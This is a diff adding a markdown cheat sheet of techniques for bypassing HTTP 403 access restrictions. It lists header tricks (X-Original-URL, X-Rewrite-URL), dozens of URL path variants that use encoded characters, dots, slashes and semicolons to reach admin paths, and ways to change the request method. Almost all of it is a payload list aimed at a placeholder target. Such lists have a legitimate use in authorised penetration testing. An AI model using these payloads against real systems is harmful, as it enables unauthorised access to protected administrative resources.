@@ -1,0 +1,111 @@
+---
+
+### **Bypass 403 (Forbidden) Techniques**
+
+#### **1. Using Headers**
+- **X-Original-URL Header**:
+  - Request:
+    ```
+    GET /anything HTTP/1.1
+    Host: target.com
+    X-Original-URL: /admin
+    ```
+
+#### **2. URL Manipulation**
+- **Appending %2e**:
+  - Original URL: `http://target.com/admin` → 403
+  - Bypass URL: `http://target.com/%2e/admin` → 200
+
+- **Adding Dots, Slashes, and Semicolons**:
+  - `http://target.com/secret/.` → 200
+  - `http://target.com//secret//` → 200
+  - `http://target.com/./secret/.` → 200
+  - `http://target.com/:/secret` → 200
+  - `http://target.com/.i/secret` → 200
+  - `http://target.com//;//secret` → 200
+
+#### **3. Changing Request Method**
+- Change the request method from **GET** to **TRACE** (or other methods like POST, HEAD, OPTIONS).
+
+#### **4. URL Variations**
+- `url.com/admin/?`
+- `url.com//admin//`
+- `url.com///admin///`
+- `url.com/./admin/.`
+- `url.com/admin?`
+- `url.com/admin%20?`
+- `url.com/admin%20/`
+- `url.com/admin/..`
+- `url.com/admin/../`
+- `url.com/admin/.`
+- `url.com/admin/.%20/`
+- `url.com/admin/*`
+- `url.com/admin//*`
+- `url.com/admin/%2f/`
+- `url.com/admin/%20`
+- `url.com/admin/%20/`
+- `url.com/admin/%09`
+- `url.com/admin/%09/`
+- `url.com/admin/%0a`
+- `url.com/admin/%0a/`
+- `url.com/admin/%0d`
+- `url.com/admin/%0d/`
+- `url.com/admin/%25`
+- `url.com/admin/%25/`
+- `url.com/admin/%23`
+- `url.com/admin/%23/`
+- `url.com/admin/%26`
+- `url.com/admin/%3f/`
+- `url.com/admin/#`
+- `url.com/admin/#/`
+- `url.com/admin/#/.`
+- `url.com/./admin`
+- `url.com/./admin/`
+
+#### **5. Advanced URL Manipulation**
+- `url.com/admin/.json`
+- `url.com/admin;`
+- `url.com/admin/#/.`
+- `url.com/./admin`
+- `url.com/..;/admin/`
+- `url.com/.;/admin/`
+- `url.com/;/admin`
+- `url.com//;//admin`
+- `url.com/%2e/admin`
+- `url.com/admin/..;/`
+- `url.com/admin.json`
+- `url.com/admin%0a`
+- `url.com/admin.css`
+- `url.com/admin.html`
+- `url.com/admin?id=1`
+- `url.com/admin~`
+- `url.com/admin/é`
+- `url.com/admin/-`
+- `url.com/admin/..%3B/`
+- `url.com/admin/;%2f..%2F..%2F`
+- `url.com/ADMIN`
+- `url.com/admin/..\\;/`
+- `url.com/ADM+IN/`
+- `url.com/admin/*/`
+- `url.com/admin\\/\\/`
+- `url.com/*/admin`
+- `url.com/*/admin/`
+- `url.com/ADM+IN`
+
+#### **6. Slash Manipulation**
+- Try using variations like `/`, `//`, `\\`, `/\\`, etc.
+
+#### **7. Request Headers**
+- Try using all possible request methods (POST, HEAD, OPTIONS, TRACE, etc.).
+
+#### **8. References**
+- Exploiting HTTP Parsers Inconsistencies: https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies (Nginx ACL)
+
+---
+
+### **Tips**
+- Always test different URL encodings and special characters.
+- Experiment with various HTTP headers like `X-Original-URL`, `X-Rewrite-URL`, etc.
+- Use tools like Burp Suite or ZAP to automate testing of different request methods and headers.
+
+---
